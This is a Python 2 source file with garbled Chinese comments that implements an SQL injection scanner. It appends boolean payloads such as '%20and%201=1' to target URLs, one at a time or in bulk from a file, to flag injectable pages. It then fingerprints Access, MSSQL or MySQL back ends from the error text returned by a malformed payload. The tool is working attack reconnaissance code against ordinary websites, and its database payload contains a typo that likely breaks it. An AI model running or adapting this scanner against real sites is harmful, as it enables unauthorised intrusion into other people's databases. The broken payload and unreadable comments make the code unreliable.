#coding=gb2312
import urllib
import os
import string
from re import search

class injectTest():
    def __init__(self,url=''):
        self.url=url             #�������ַ,Ĭ��Ϊ��
        self.a='%20and%201=1'  #������
        self.b='%20and%201=2'
        self.urls=[]             #����ע���urls

    #��ⵥ����ַ�ĺ���
    def judgeUrl(self):
        page=urllib.urlopen(self.url).read()
        pagea=urllib.urlopen(self.url+self.a).read()
        pageb=urllib.urlopen(self.url+self.b).read()
        if page==pagea and page!=pageb:
            print ('��ַ',self.url,'���ܴ���ע���!')
            return True
        else:
            print ('��ַ:',self.url,'������ע���!')
            return False

    #�жϴ�������ַ�ļ��Ƿ����
    def fileExists(self,name):
        path=os.getcwd()
        filepath=path+'\\'
        filepath=filepath+name
        return os.path.exists(filepath)

    #�����������
    def judgeUrls(self,file):
        self.fileExists(file)
        #���������Ĭ�ϼ�����ַ�ļ�,�����û���������������ļ�
        while not self.fileExists(file):
            print ('�������ַ�ļ�������')
            file=str(input('�������������ַ�ļ�:'))
            self.fileExists(file)
        urls=open(file,'r')
        for url in urls.readlines():
            print ('���ڼ��:',url)
            page=urllib.urlopen(url).read()
            pagea=urllib.urlopen(url+self.a).read()
            pageb=urllib.urlopen(url+self.b).read()
            if page==pagea and page!=pageb:
                self.urls.append(url)
            else:
                continue
        if len(self.urls):
            print ('������ַ���ܴ���ע���:')
            for u in self.urls:
                print (u)
        else:
            print ('���ļ��в�������ע�����ַ!')

    #�ж���ע�����ַ�����ݿ�����
    #��������ڻ��Դ���,����ܲ����жϳ����ݿ������
    def whatDatabase(self):
        db=''
        sql=string.join(['%20and20%user>0'],'')
        pagex=urllib.urlopen(self.url+sql).read()
        if search('ODBC Microsoft Access',pagex) or search('Microsoft JET Database',pagex) :
            print ('���ݿ�:Access')
            db='Access'
            return db
        elif search('SQL Server',pagex) or search('nvarchar',pagex):
            print ('���ݿ�:MSSQL')
            db='MSSQL'
            return  db
        elif search('You have an error in your SQL syntax',pagex) or search('Query failed',pagex) or search('SQL query failed',pagex) or search('mysql_fetch_',pagex) or search('mysql_num_rows',pagex) or search('The used SELECT statements have a different number of columns',pagex):
            print ('���ݿ�:MYSQL')
            db='MYSQL'
            return db
        else:
            print ('δ�жϳ����ݿ�����!')
            return db